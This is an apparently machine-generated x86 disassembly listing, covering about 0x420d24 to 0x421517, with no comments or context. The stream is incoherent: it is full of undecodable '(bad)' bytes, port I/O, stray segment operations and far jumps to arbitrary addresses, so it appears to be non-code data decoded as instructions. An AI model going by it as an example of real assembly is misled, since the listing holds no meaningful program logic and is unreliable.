  420d24:	pop    ds
  420d25:	lahf   
  420d26:	test   al,0x5c
  420d28:	loopne 0x420cad
  420d2a:	lahf   
  420d2b:	xchg   DWORD PTR [ebp+0x17d518cf],ebx
  420d31:	lea    edi,[ecx-0x71]
  420d34:	xor    al,0xff
  420d36:	jb     0x420d7f
  420d38:	lods   al,BYTE PTR ds:[esi]
  420d39:	xchg   BYTE PTR [ecx],bh
  420d3b:	add    DWORD PTR [ebx],esp
  420d3d:	leave  
  420d3e:	loop   0x420d71
  420d40:	or     DWORD PTR [ebp+0x19150611],edx
  420d46:	mov    ah,0xa5
  420d48:	lahf   
  420d49:	retf   
  420d4a:	(bad)  [edx]
  420d4c:	in     eax,0x9b
  420d4e:	loopne 0x420d10
  420d50:	les    ecx,FWORD PTR [edx]
  420d52:	inc    ebx
  420d53:	mov    cl,0x14
  420d55:	fdivr  QWORD PTR [ebp-0x1bc1abf6]
  420d5b:	cmp    BYTE PTR [edi+0x17cd0f47],ah
  420d61:	jns    0x420dc0
  420d63:	mov    cl,0x76
  420d65:	dec    ebx
  420d66:	mov    DWORD PTR [edi-0x31],ecx
  420d69:	cmc    
  420d6a:	imul   edx,DWORD PTR [ebx+esi*1+0x77e79161],0xffffffea
  420d72:	push   edx
  420d73:	mov    esp,ebp
  420d75:	mov    bh,0x68
  420d77:	mov    esp,0xcc97f6
  420d7c:	xchg   edi,eax
  420d7d:	loope  0x420d47
  420d7f:	jae    0x420d5e
  420d81:	je     0x420d38
  420d83:	push   esi
  420d84:	cmp    ch,ch
  420d86:	shr    DWORD PTR [esi-0x20166c4],1
  420d8c:	out    0x4a,eax
  420d8e:	mov    eax,DWORD PTR [edi-0x2f5a02e6]
  420d94:	pusha  
  420d95:	pop    edi
  420d96:	dec    edi
  420d97:	adc    al,0xed
  420d99:	sbb    BYTE PTR [edi],ch
  420d9b:	pop    ss
  420d9c:	sar    eax,cl
  420d9e:	sub    DWORD PTR [ecx],ebp
  420da0:	sub    DWORD PTR [esi],edx
  420da2:	in     eax,0xa6
  420da4:	cmp    ch,BYTE PTR [edi]
  420da6:	shl    BYTE PTR [edi+0x18],cl
  420da9:	sbb    eax,0x2ab6fd4a
  420dae:	retf   
  420daf:	push   0xd
  420db1:	mov    ebx,0x7853859
  420db6:	test   dl,0xb1
  420db9:	bound  eax,QWORD PTR [edi+0x69b9ae16]
  420dbf:	mov    ebp,0x6e5d5654
  420dc4:	xchg   ecx,eax
  420dc5:	pop    ecx
  420dc6:	outs   dx,BYTE PTR ds:[esi]
  420dc7:	test   al,0x20
  420dc9:	repz test BYTE PTR [esi+0x4d],ah
  420dcd:	pusha  
  420dce:	adc    al,0x90
  420dd0:	push   0xffffffe4
  420dd2:	cmp    BYTE PTR [esi],bh
  420dd4:	mov    cl,0x2f
  420dd6:	pop    esp
  420dd7:	out    0x36,al
  420dd9:	std    
  420dda:	pop    es
  420ddb:	loop   0x420e33
  420ddd:	(bad)  
  420ddf:	in     eax,0xa9
  420de1:	and    edx,DWORD PTR [edi]
  420de3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420de4:	callw  0xe8e9
  420de8:	test   edx,esi
  420dea:	test   eax,0x25f81ada
  420def:	retf   0x5da8
  420df2:	push   cs
  420df3:	mov    ds:0x8559b71f,eax
  420df8:	adc    DWORD PTR [edx+0x2d24a6bd],edi
  420dfe:	xchg   ecx,eax
  420dff:	xchg   esp,eax
  420e00:	mov    eax,0xde69756f
  420e05:	jb     0x420e7a
  420e07:	out    0xcc,al
  420e09:	pop    ecx
  420e0a:	test   eax,0x9134b8b0
  420e0f:	gs jns 0x420dfe
  420e12:	jno    0x420df3
  420e14:	sbb    al,0x7e
  420e16:	ret    0xb830
  420e19:	adc    eax,0xa1f6fd02
  420e1e:	test   ah,ah
  420e20:	rol    DWORD PTR [esp+ecx*1-0x4f],0xc0
  420e25:	adc    edx,edi
  420e27:	repnz stc 
  420e29:	inc    eax
  420e2a:	pop    esp
  420e2b:	fstp   TBYTE PTR [ecx-0x51]
  420e2e:	mov    eax,0xa3f8b58e
  420e33:	pop    ds
  420e34:	call   0xaa39346f
  420e39:	syscall 
  420e3b:	iret   
  420e3c:	cmp    al,0x7a
  420e3e:	out    dx,eax
  420e3f:	scas   al,BYTE PTR es:[edi]
  420e40:	stos   BYTE PTR es:[edi],al
  420e41:	pop    esi
  420e42:	int    0x46
  420e44:	mov    DWORD PTR [ecx+0x35],edi
  420e47:	inc    ebp
  420e48:	mov    edi,0xbf6105da
  420e4d:	and    DWORD PTR [ebp+0x1ad5ac7d],edx
  420e53:	or     edi,edi
  420e55:	mov    cs,WORD PTR [ebx+edi*4+0x53cf2cda]
  420e5c:	sbb    bh,dh
  420e5e:	push   0x72
  420e60:	or     BYTE PTR [ebx+0x12],0x19
  420e64:	leave  
  420e65:	sbb    ebx,ebp
  420e67:	mov    ecx,0x9cc8b089
  420e6c:	fwait
  420e6d:	mov    eax,ds:0xe7776722
  420e72:	cmp    edx,esi
  420e74:	repz xor DWORD PTR [esi],eax
  420e77:	or     DWORD PTR [edx+0x51],0x24
  420e7b:	adc    eax,0x2de6e2c8
  420e80:	inc    bx
  420e82:	call   0xc950:0x308b8a45
  420e89:	adc    eax,esp
  420e8b:	shl    BYTE PTR [ebx],1
  420e8d:	inc    edx
  420e8e:	in     al,0x95
  420e90:	cli    
  420e91:	cwde   
  420e92:	stos   BYTE PTR es:[edi],al
  420e93:	push   esp
  420e94:	dec    ecx
  420e95:	sbb    ch,dl
  420e97:	lods   eax,DWORD PTR ds:[esi]
  420e98:	retf   0xa6e4
  420e9b:	ror    BYTE PTR [ebp+0x3af93596],cl
  420ea1:	sub    BYTE PTR [eax+0x137f4047],0x6e
  420ea8:	add    ecx,DWORD PTR [si]
  420eab:	sbb    al,0xe5
  420ead:	mov    BYTE PTR [esi-0x19],ch
  420eb0:	inc    BYTE PTR [edx]
  420eb2:	mov    ds:0x38ccfd95,al
  420eb7:	mov    eax,0x1dc90463
  420ebc:	retf   0x8ad0
  420ebf:	xchg   esi,eax
  420ec0:	add    al,0x12
  420ec2:	ror    BYTE PTR [edx],1
  420ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ec5:	pop    es
  420ec6:	jmp    0x420e60
  420ec8:	jne    0x420e6a
  420eca:	adc    al,0x6a
  420ecc:	cmc    
  420ecd:	arpl   bp,bp
  420ecf:	push   0x497a503e
  420ed4:	pop    ds
  420ed5:	cmp    bh,BYTE PTR [edi+0x6012575d]
  420edb:	test   BYTE PTR [ecx],0xea
  420ede:	xor    eax,0x19a01835
  420ee3:	cmp    BYTE PTR [edx-0x70b5be33],dh
  420ee9:	pop    ds
  420eea:	in     eax,0xdf
  420eec:	pop    ss
  420eed:	dec    edi
  420eee:	jecxz  0x420f4b
  420ef0:	cdq    
  420ef1:	mov    ecx,0x36a0364d
  420ef6:	sub    DWORD PTR [eax],eax
  420ef8:	ror    DWORD PTR [edi+0x19fcb2a],0xa3
  420eff:	aam    0x5d
  420f01:	and    BYTE PTR [edx-0x42],ah
  420f04:	dec    edx
  420f05:	(bad)  
  420f06:	les    ebx,FWORD PTR [edx+0x8]
  420f09:	ins    DWORD PTR es:[edi],dx
  420f0a:	inc    eax
  420f0c:	xor    BYTE PTR [ebx+0x5c],cl
  420f0f:	pop    ds
  420f10:	mov    ch,0x3d
  420f12:	fwait
  420f13:	mov    esi,0x2a8cc861
  420f18:	mov    DWORD PTR [edx-0x10f8c613],esp
  420f1e:	dec    edi
  420f1f:	pop    ss
  420f20:	inc    esi
  420f21:	mov    edx,0xecea1616
  420f26:	outs   dx,BYTE PTR ds:[esi]
  420f27:	inc    edx
  420f28:	and    al,0xc8
  420f2a:	sbb    DWORD PTR [esi+0x5a6654bb],edx
  420f30:	addr16 xchg esi,eax
  420f32:	enter  0xb4c3,0x18
  420f36:	push   ds
  420f37:	out    0xa1,al
  420f39:	sti    
  420f3a:	test   eax,0xa7005261
  420f3f:	icebp  
  420f40:	mov    BYTE PTR [esi],dl
  420f42:	sbb    esi,ebp
  420f44:	xchg   ebp,eax
  420f45:	pop    ebp
  420f46:	fdivr  DWORD PTR [eax+0x42]
  420f49:	dec    ebx
  420f4a:	push   ds
  420f4b:	les    edi,FWORD PTR [esi-0x392c8ebb]
  420f51:	dec    edx
  420f52:	loopne 0x420f0a
  420f54:	test   BYTE PTR [esp+ecx*2],0x13
  420f58:	cmp    dl,0x97
  420f5b:	fidiv  WORD PTR [ebx-0x47f34fb]
  420f61:	sahf   
  420f62:	adc    al,BYTE PTR [edi]
  420f64:	mul    bl
  420f66:	ja     0x420f2c
  420f68:	xor    edx,DWORD PTR [edx-0x21]
  420f6b:	xchg   bl,dh
  420f6d:	fcomp  QWORD PTR [eax]
  420f6f:	push   ss
  420f70:	jl     0x420f6c
  420f72:	inc    ebx
  420f73:	xor    DWORD PTR [edx+ebp*2-0x50],esi
  420f77:	and    al,0x91
  420f79:	xchg   esi,eax
  420f7a:	ins    BYTE PTR es:[edi],dx
  420f7b:	push   eax
  420f7c:	rol    BYTE PTR [ecx+0x544513c1],0xb1
  420f83:	sbb    eax,DWORD PTR [ebx]
  420f85:	int3   
  420f86:	mov    edx,DWORD PTR ds:0x51129dc1
  420f8c:	adc    al,0x2e
  420f8e:	cdq    
  420f8f:	mov    ecx,0x70b13689
  420f94:	fisttp QWORD PTR [esi-0x25]
  420f97:	pop    ds
  420f98:	retf   0x1a64
  420f9b:	sbb    ah,0xe4
  420f9e:	cdq    
  420f9f:	jle    0x420f96
  420fa1:	aaa    
  420fa2:	xor    al,0x72
  420fa4:	pop    ss
  420fa5:	mov    ecx,0x1a5bd451
  420faa:	or     DWORD PTR [eax],ebp
  420fac:	xchg   ecx,eax
  420fad:	push   eax
  420fae:	mov    al,0x5
  420fb0:	or     BYTE PTR [eax-0x50028d7d],dh
  420fb6:	mov    ds:0x96fe39e1,al
  420fbb:	imul   bx,dx,0xff99
  420fbf:	mov    ch,0x16
  420fc1:	mov    dh,0xdf
  420fc3:	addr16 adc eax,0xcb6a2f77
  420fc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fca:	and    DWORD PTR [edx-0x41e8b7b8],esp
  420fd0:	shr    BYTE PTR ds:0x7962af28,cl
  420fd6:	mov    dl,BYTE PTR [ebx-0x31]
  420fd9:	gs inc ebp
  420fdb:	xor    DWORD PTR [edx+0x42],ecx
  420fde:	retf   
  420fdf:	push   ecx
  420fe0:	jge    0x420f7c
  420fe2:	sbb    DWORD PTR [esp+ebp*4+0x5c35cc24],ebx
  420fe9:	sub    DWORD PTR [edi],esp
  420feb:	(bad)  [ecx]
  420fed:	pop    ss
  420fee:	pop    ss
  420fef:	repz ss inc ecx
  420ff2:	jae    0x420ffb
  420ff4:	in     al,dx
  420ff5:	ss pushf 
  420ff7:	dec    esp
  420ff8:	test   DWORD PTR [edi-0x710ebe23],0x1879954b
  421002:	or     eax,0xa769f1ca
  421007:	inc    edx
  421008:	shr    ecx,1
  42100a:	lea    ebp,[edi-0x57524f5]
  421010:	push   ss
  421011:	dec    edx
  421012:	sahf   
  421013:	mov    ds:0xdde423b2,al
  421018:	mov    bl,0xfc
  42101a:	mov    edi,0x4fc2fa4a
  42101f:	dec    edx
  421020:	push   ecx
  421021:	sahf   
  421022:	inc    edi
  421023:	sbb    al,0x34
  421025:	sbb    esi,ecx
  421027:	pusha  
  421028:	adc    al,0xa3
  42102a:	and    ebx,DWORD PTR [ebp+0x49525bc]
  421030:	daa    
  421031:	jnp    0x421016
  421033:	mov    eax,ds:0xf2276b11
  421038:	outs   dx,DWORD PTR ds:[esi]
  421039:	sbb    eax,0xce085686
  42103e:	pop    edi
  42103f:	mov    dl,0x25
  421041:	rol    DWORD PTR [ebx],cl
  421043:	jne    0x42108b
  421045:	bound  edx,QWORD PTR [ebx+0x2fe5b16f]
  42104b:	dec    edx
  42104c:	aad    0xee
  42104e:	pop    ss
  42104f:	xchg   ecx,eax
  421050:	loope  0x420ff9
  421052:	rol    ch,0x76
  421055:	loopne 0x421032
  421057:	xor    BYTE PTR [esi+0x2c],dl
  42105a:	sti    
  42105b:	jo     0x4487579c
  421061:	fnstcw WORD PTR [esi]
  421063:	inc    BYTE PTR [ebp-0x7101a7e]
  421069:	test   BYTE PTR fs:[esi-0x16597f38],0xa2
  421071:	in     al,0x35
  421073:	scas   al,BYTE PTR es:[edi]
  421074:	push   eax
  421075:	addr16 mov esp,0x36c8ceb8
  42107b:	dec    edi
  42107c:	jne    0x4210e5
  42107e:	add    cl,cl
  421080:	xlat   BYTE PTR ds:[ebx]
  421081:	imul   dh
  421083:	cmc    
  421084:	cmp    eax,0x5266e6b4
  421089:	add    ebx,ecx
  42108b:	mov    ds:0xe31f3c61,eax
  421090:	pop    ebp
  421091:	stc    
  421092:	popa   
  421093:	mov    ecx,0x4a3a1173
  421098:	or     cl,0xee
  42109b:	arpl   bp,di
  42109d:	push   es
  42109e:	inc    ebp
  42109f:	push   eax
  4210a0:	mov    eax,ds:0xa2620454
  4210a5:	iret   
  4210a6:	mov    BYTE PTR [esi-0x7c],bl
  4210a9:	lahf   
  4210aa:	mov    eax,ds:0xecced3f8
  4210af:	out    0x44,eax
  4210b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210b2:	iret   
  4210b3:	(bad)  
  4210b4:	xchg   esp,eax
  4210b5:	mov    ebx,0xbc58e5ec
  4210ba:	dec    esi
  4210bb:	adc    bl,BYTE PTR [ecx+eax*4]
  4210be:	xor    eax,DWORD PTR [ebp-0x74]
  4210c1:	sub    dh,BYTE PTR [edx-0x1f]
  4210c4:	or     BYTE PTR [esp+edx*2],dl
  4210c7:	test   DWORD PTR fs:[edx+eiz*4+0x58573711],edx
  4210cf:	adc    DWORD PTR [edx+edi*2+0x15],eax
  4210d3:	mov    al,0x3d
  4210d5:	fdiv   DWORD PTR [edx*8-0x6eda77f2]
  4210dc:	jae    0x42106d
  4210de:	iret   
  4210df:	fild   DWORD PTR [edi]
  4210e1:	mov    ebx,DWORD PTR [ecx+0x6f986de2]
  4210e7:	xor    al,BYTE PTR [edx]
  4210e9:	test   BYTE PTR [ecx],ah
  4210eb:	jecxz  0x42111b
  4210ed:	es out dx,eax
  4210ef:	and    eax,0x22878214
  4210f4:	sbb    eax,0x7bfec1c
  4210f9:	les    esp,FWORD PTR ds:0x239c9ac2
  4210ff:	fsub   QWORD PTR [eax+0x547319bb]
  421105:	aas    
  421106:	mov    DWORD PTR [ebx+0x78],esp
  421109:	mov    bh,0xeb
  42110b:	pop    ss
  42110c:	jg     0x42115a
  42110e:	xchg   esp,eax
  42110f:	out    dx,eax
  421110:	popf   
  421111:	sbb    esi,0xffffffd4
  421114:	dec    ebp
  421115:	pop    edi
  421116:	ins    DWORD PTR es:[edi],dx
  421117:	jb     0x421148
  421119:	popf   
  42111a:	add    al,0x67
  42111c:	jmp    0x4210b5
  42111e:	dec    eax
  42111f:	fs out dx,al
  421121:	fwait
  421122:	inc    ebp
  421123:	jle    0x42117a
  421125:	adc    eax,0xf23f168
  42112a:	imul   DWORD PTR [ebp+0x3af9d22d]
  421130:	inc    ebp
  421131:	mov    dh,0x4e
  421133:	popa   
  421134:	cmc    
  421135:	mov    esi,0x4d44256c
  42113a:	jg     0x4211a4
  42113c:	inc    eax
  42113d:	pop    edx
  42113e:	or     dl,bh
  421140:	(bad)  
  421141:	and    edx,DWORD PTR [ebp-0x48]
  421144:	inc    esi
  421145:	mov    eax,ds:0x6b76c03c
  42114a:	pop    ebx
  42114b:	xchg   di,ax
  42114d:	jb     0x421157
  42114f:	daa    
  421150:	jo     0x421119
  421152:	push   ss
  421153:	repz pop es
  421155:	mov    ds:0x5bba31d3,ax
  42115b:	in     eax,dx
  42115c:	lock dec ebx
  42115e:	cmp    eax,0xfe39378e
  421163:	hlt    
  421164:	shl    DWORD PTR ds:0xe4373913,0xc7
  42116b:	mov    dl,0x9b
  42116d:	enter  0x3cc0,0x10
  421171:	addr16 pushf 
  421173:	bound  esi,QWORD PTR [eax]
  421175:	sahf   
  421176:	outs   dx,DWORD PTR ds:[esi]
  421177:	and    ch,BYTE PTR [edx+0x2508cb9e]
  42117d:	rol    BYTE PTR [esi+esi*4-0x624000f],0xb2
  421185:	adc    al,0x8
  421187:	call   0xfa5c:0x674cd6c4
  42118e:	test   BYTE PTR [edi+0x18],bl
  421191:	sbb    al,0xb4
  421193:	pop    ss
  421194:	and    esi,ebx
  421196:	jecxz  0x4211c1
  421198:	inc    edi
  421199:	adc    eax,0x80b6ecd
  42119e:	push   edx
  42119f:	lods   al,BYTE PTR ds:[esi]
  4211a0:	jno    0x42115e
  4211a2:	jmp    0x4211fa
  4211a4:	fs es cli 
  4211a7:	and    BYTE PTR [esi+0x77f2b6db],dl
  4211ad:	out    0x44,eax
  4211af:	xor    eax,0xffc66318
  4211b4:	push   ebp
  4211b5:	or     esp,esi
  4211b7:	test   BYTE PTR [ebx-0x30d4b431],dl
  4211bd:	not    BYTE PTR ds:0xb8acc873
  4211c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211c4:	mov    BYTE PTR [ebx+0x50b95b10],cl
  4211ca:	lahf   
  4211cb:	jmp    0x33ed:0x79b92122
  4211d2:	mov    bl,0x75
  4211d4:	jmp    0x421156
  4211d6:	xor    cl,BYTE PTR [esi]
  4211d8:	mov    dl,0x8a
  4211da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211dc:	mov    dh,0xcf
  4211de:	retf   0x25c8
  4211e1:	mov    esp,0xd6ab98c3
  4211e6:	es sub eax,0x8b98bd71
  4211ec:	mov    BYTE PTR [edi],cl
  4211ee:	push   ds
  4211ef:	sub    bl,BYTE PTR [ebp-0x5d]
  4211f2:	or     edi,ebp
  4211f4:	xchg   esi,eax
  4211f5:	jne    0x421272
  4211f7:	xor    eax,0xd94379e8
  4211fc:	jbe    0x4211ae
  4211fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211ff:	xchg   ecx,eax
  421200:	mov    edx,DWORD PTR [esi-0x51fa04c2]
  421206:	std    
  421207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421208:	adc    esp,esp
  42120a:	dec    edi
  42120b:	out    dx,al
  42120c:	stc    
  42120d:	and    DWORD PTR [ebx-0x5d843d98],0x44
  421214:	in     al,0x2b
  421216:	xchg   ebx,eax
  421217:	pop    ds
  421218:	xchg   ebx,eax
  421219:	cmc    
  42121a:	push   ss
  42121b:	pop    ebp
  42121c:	or     ebp,0x44
  42121f:	fild   WORD PTR [edx]
  421221:	call   0xe152:0xc15e1d5b
  421228:	cmc    
  421229:	ss js  0x4211fd
  42122c:	loope  0x4212ab
  42122e:	xchg   esp,eax
  42122f:	mov    dl,0x45
  421231:	adc    BYTE PTR [edx+edi*8-0x6619f927],bh
  421238:	js     0x421278
  42123a:	fisubr DWORD PTR [ecx]
  42123c:	daa    
  42123d:	lock mov edi,0xab45982e
  421243:	jno    0x4212c4
  421245:	mov    esp,0x5780bbf3
  42124a:	test   BYTE PTR [edi],dl
  42124c:	sbb    esi,esi
  42124e:	pop    ebx
  42124f:	es mov dl,0x1f
  421252:	jmp    0x79a2:0x40e202c0
  421259:	pusha  
  42125a:	addr16 and esp,0xffffffa9
  42125e:	rcl    DWORD PTR [eax],cl
  421260:	sbb    BYTE PTR [eax],0x6c
  421263:	jno    0x421244
  421265:	and    edx,DWORD PTR [ebx-0x74]
  421268:	sub    bh,dh
  42126a:	sbb    al,0xd
  42126c:	pop    edi
  42126d:	jns    0x421221
  42126f:	or     al,0x83
  421271:	jg     0x421200
  421273:	cmp    DWORD PTR [esp+esi*4-0x744c550a],edx
  42127a:	or     DWORD PTR [ebx-0x2e],edi
  42127d:	test   al,0x64
  42127f:	shl    DWORD PTR cs:[edi],cl
  421282:	pop    ss
  421283:	cmp    eax,0x5b239f65
  421288:	or     ecx,DWORD PTR [edx]
  42128a:	inc    ebx
  42128b:	xchg   esp,eax
  42128c:	mov    eax,0xbb89c78f
  421291:	in     al,0x3f
  421293:	mov    ch,0xa5
  421295:	retf   
  421296:	lods   al,BYTE PTR ds:[esi]
  421297:	adc    BYTE PTR ss:[eax-0x56],bl
  42129b:	and    eax,0x81bbc031
  4212a0:	xor    ebp,esi
  4212a2:	loope  0x421295
  4212a4:	retf   0x8a90
  4212a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212a8:	adc    BYTE PTR [ecx],bh
  4212aa:	xchg   edx,eax
  4212ab:	push   edx
  4212ac:	ja     0x421309
  4212ae:	mul    BYTE PTR [edx+eiz*2+0x10deb741]
  4212b5:	popa   
  4212b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212b7:	push   ebp
  4212b8:	repz push ebp
  4212ba:	jmp    0x3203ae77
  4212bf:	arpl   WORD PTR [esi+0x56],sp
  4212c2:	xchg   BYTE PTR [edi+eiz*4],ch
  4212c5:	adc    BYTE PTR [edi-0x15],bh
  4212c8:	je     0x421308
  4212ca:	dec    esp
  4212cb:	arpl   WORD PTR [esi-0x1c],bp
  4212ce:	mov    ecx,0x7811b8
  4212d3:	pusha  
  4212d4:	arpl   WORD PTR [edi-0x48],ax
  4212d7:	sbb    edx,DWORD PTR [esi]
  4212d9:	stos   DWORD PTR es:[edi],eax
  4212da:	jo     0x4212d9
  4212dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212dd:	xor    eax,0xb97eba9
  4212e2:	enter  0xef1,0x7e
  4212e6:	(bad)
  4212ea:	lods   eax,DWORD PTR ds:[esi]
  4212eb:	dec    eax
  4212ec:	fwait
  4212ed:	lods   eax,DWORD PTR ds:[esi]
  4212ee:	leave  
  4212ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212f0:	sbb    DWORD PTR [eax],ebp
  4212f2:	or     esp,ebx
  4212f4:	adc    bl,BYTE PTR [edx-0x47d27e9e]
  4212fa:	fs mov edi,0x22ec01f7
  421300:	mov    ds:0x73f0feba,al
  421305:	jle    0x421329
  421307:	int3   
  421308:	mov    BYTE PTR [edx],0x6
  42130b:	iret   
  42130c:	mov    eax,0x56905305
  421311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421312:	inc    edi
  421313:	outs   dx,DWORD PTR ds:[esi]
  421314:	mov    al,ds:0x986dbcc5
  421319:	mov    eax,ds:0xa1f827d1
  42131e:	call   0xe8bedee8
  421323:	xchg   ecx,eax
  421324:	mov    ah,0xe5
  421326:	inc    edx
  421327:	adc    bl,BYTE PTR [esi-0x5f3b87f7]
  42132d:	jle    0x421344
  42132f:	and    ebx,DWORD PTR [edx]
  421331:	jbe    0x4213af
  421333:	jle    0x4213ad
  421335:	and    esi,DWORD PTR [eax]
  421337:	int3   
  421338:	jns    0x421314
  42133a:	add    eax,0x6b052b6e
  42133f:	rol    edx,cl
  421341:	dec    ebx
  421342:	sub    DWORD PTR [ebp-0x48352505],eax
  421348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421349:	add    eax,0x93f467e
  42134e:	xchg   ecx,eax
  42134f:	es sti 
  421351:	int3   
  421352:	adc    ecx,DWORD PTR [ebx-0x3a]
  421355:	in     eax,0x48
  421357:	ja     0x4213c8
  421359:	mov    ebx,0x30b16803
  42135e:	inc    ebx
  42135f:	(bad)  
  421360:	aas    
  421361:	cmc    
  421362:	jno    0x42138a
  421364:	pop    ebp
  421365:	adc    eax,0x3e7e807b
  42136a:	sub    eax,ecx
  42136c:	add    ecx,DWORD PTR ds:[ebp+ebp*8-0x7d51593d]
  421374:	rcr    BYTE PTR [eax+eiz*1+0x18ffef53],cl
  42137b:	fst    st(2)
  42137d:	stc    
  42137e:	or     DWORD PTR [ecx],eax
  421380:	and    ebp,DWORD PTR [edx]
  421382:	jns    0x4213ac
  421384:	inc    DWORD PTR [edx-0x1a1431d1]
  42138a:	cmp    ecx,DWORD PTR [ebx-0x60]
  42138d:	xor    DWORD PTR [edi+0x5c25f35d],ebp
  421393:	or     eax,0x93c9595d
  421398:	sbb    DWORD PTR [eax],esi
  42139a:	mov    ah,0x5f
  42139c:	(bad)  
  42139d:	sahf   
  42139e:	cmp    ch,BYTE PTR [ebp+0x52ec6bcc]
  4213a4:	push   edi
  4213a5:	jnp    0x4213f8
  4213a7:	(bad)  
  4213a8:	dec    ebp
  4213a9:	enter  0x15c8,0xde
  4213ad:	adc    al,0x83
  4213b0:	repnz inc ebp
  4213b2:	pusha  
  4213b3:	dec    esp
  4213b4:	add    BYTE PTR [esi],ah
  4213b6:	cwde   
  4213b7:	cmp    DWORD PTR [ecx-0x1ae271eb],0xffffffe3
  4213be:	or     al,0xb9
  4213c0:	xchg   edi,eax
  4213c1:	call   0xdee8a3fb
  4213c6:	and    al,0x1e
  4213c8:	sbb    al,BYTE PTR [eax+0x277e8ef4]
  4213ce:	push   edx
  4213cf:	test   ch,0x49
  4213d2:	cli    
  4213d3:	pop    ebp
  4213d4:	push   es
  4213d5:	clc    
  4213d6:	mov    dl,0x5c
  4213d8:	cmp    eax,DWORD PTR [edx-0x75]
  4213db:	rcl    BYTE PTR [edx+0x3e6c134a],cl
  4213e1:	sti    
  4213e2:	test   BYTE PTR [edx-0x2088ea20],dh
  4213e8:	cmp    DWORD PTR [eax+0x1d],ecx
  4213eb:	inc    eax
  4213ec:	inc    ebp
  4213ed:	fs and eax,0x10267b02
  4213f3:	inc    esp
  4213f4:	leave  
  4213f5:	mov    ebp,0xee1c5069
  4213fa:	jmp    0x4213cd
  4213fc:	sub    eax,0x6aceb956
  421401:	fcmovbe st,st(7)
  421403:	ret    0x8337
  421406:	xchg   ebx,ebx
  421408:	cmp    BYTE PTR [ecx-0x12],bl
  42140b:	aam    0x7d
  42140d:	mov    cl,0xa2
  42140f:	mov    edx,0x1f13fd16
  421414:	lods   eax,DWORD PTR gs:[esi]
  421416:	jbe    0x4213fe
  421418:	je     0x4213a7
  42141a:	pop    eax
  42141b:	jne    0x4213f5
  42141d:	in     al,0xf2
  42141f:	cmc    
  421420:	pop    esp
  421421:	and    ebx,DWORD PTR [edx]
  421423:	fucomip st,st(4)
  421425:	inc    ebx
  421426:	ret    0x819b
  421429:	mov    eax,ds:0x4453895e
  42142e:	stc    
  42142f:	fstp   QWORD PTR [ecx+0x6f]
  421432:	adc    eax,DWORD PTR [esi-0x28]
  421435:	fcomip st,st(2)
  421437:	test   DWORD PTR [bx+si-0x1d],ebx
  42143b:	xlat   BYTE PTR ds:[ebx]
  42143c:	mov    ebp,0xda91b8f5
  421441:	add    cl,BYTE PTR [edi]
  421443:	icebp  
  421444:	leave  
  421445:	inc    esi
  421446:	or     al,0x89
  421448:	xor    esp,DWORD PTR [edi-0x4bb3bfe6]
  42144e:	adc    al,0x31
  421450:	pop    edi
  421451:	pusha  
  421452:	add    BYTE PTR [eax],0x92
  421455:	adc    BYTE PTR [ecx+0x6be3ed2a],0x60
  42145c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42145d:	mov    dl,0x40
  42145f:	mov    ds:0xd1290277,al
  421464:	sub    BYTE PTR [esi-0x2d],cl
  421467:	xlat   BYTE PTR ds:[ebx]
  421468:	jecxz  0x421437
  42146a:	sbb    ah,ah
  42146c:	or     cl,BYTE PTR [eax]
  42146e:	popa   
  42146f:	mov    ds:0x3d530f1,eax
  421474:	mov    esi,ebx
  421476:	sahf   
  421477:	int3   
  421478:	mov    al,ds:0xdc58a32e
  42147d:	enter  0x40a,0xd1
  421481:	mov    ch,0x46
  421483:	js     0x4214e9
  421485:	and    BYTE PTR [ecx+0x64d5bebd],bh
  42148b:	or     bh,ah
  42148d:	mov    ah,0x25
  42148f:	jnp    0x421419
  421491:	lds    ebp,FWORD PTR [esi]
  421493:	cli    
  421494:	mov    ecx,0xd4808e88
  421499:	mov    BYTE PTR [ecx+0x4d],al
  42149c:	mov    dh,0x28
  42149e:	aas    
  42149f:	hlt    
  4214a0:	cmp    DWORD PTR [esi-0xefe48c8],ecx
  4214a6:	aas    
  4214a7:	gs push ebp
  4214a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214aa:	(bad)  
  4214ab:	mov    esp,0x18586e7a
  4214b0:	test   eax,0x6c2a2592
  4214b5:	nop
  4214b6:	mov    eax,0x5e1ee6f4
  4214bb:	sti    
  4214bc:	mov    ecx,0x13645f22
  4214c1:	pushf  
  4214c2:	xchg   ecx,eax
  4214c3:	xchg   ebx,eax
  4214c4:	ins    DWORD PTR es:[edi],dx
  4214c5:	icebp  
  4214c6:	xchg   edx,eax
  4214c7:	arpl   WORD PTR [edi],bp
  4214c9:	pop    ds
  4214ca:	aad    0xe
  4214cc:	push   ecx
  4214cd:	jg     0x421507
  4214cf:	add    ch,BYTE PTR ds:0x38b9c441
  4214d5:	rcr    BYTE PTR [edi-0x11],0x90
  4214d9:	test   eax,0x32a21985
  4214de:	lds    esi,FWORD PTR [ecx]
  4214e0:	cld    
  4214e1:	cmp    al,0x63
  4214e3:	adc    edx,DWORD PTR [edx-0x4b567745]
  4214e9:	jecxz  0x4214ba
  4214eb:	dec    ebx
  4214ec:	test   eax,0xb5a3f017
  4214f1:	or     DWORD PTR [ecx],0x879916db
  4214f7:	jp     0x42151f
  4214f9:	dec    edi
  4214fa:	mov    al,0x6c
  4214fc:	(bad)  
  4214fd:	fsubp  st(7),st
  4214ff:	sar    BYTE PTR [edx+0xe],cl
  421502:	mov    bl,0xf5
  421504:	mov    ebp,0x5bdc6cc7
  421509:	mov    eax,0x7a558b0b
  42150e:	xor    ch,0x1f
  421511:	jb     0x421529
  421513:	rcl    dh,1
  421515:	jo     0x42151f
  421517:	and    al,0x68
